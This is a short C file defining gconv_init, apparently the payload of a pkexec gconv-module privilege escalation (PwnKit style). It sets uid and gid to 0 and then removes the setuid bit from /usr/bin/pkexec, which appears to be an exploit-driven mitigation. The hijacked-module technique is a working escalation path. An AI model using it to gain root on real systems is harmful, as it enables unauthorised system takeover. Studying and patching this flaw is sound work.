#include <stdlib.h>

void gconv() {}

void gconv_init() {

    char mode[] = "0755";
    //char pkexec[] = "/home/moldabekov/bin";
    char pkexec[] = "/usr/bin/pkexec";

    setuid(0);
    setgid(0);
	
    int bit = strtol(mode, 0, 8);
    if (chmod(pkexec, bit) < 0) {
	exit(1);
    }

}
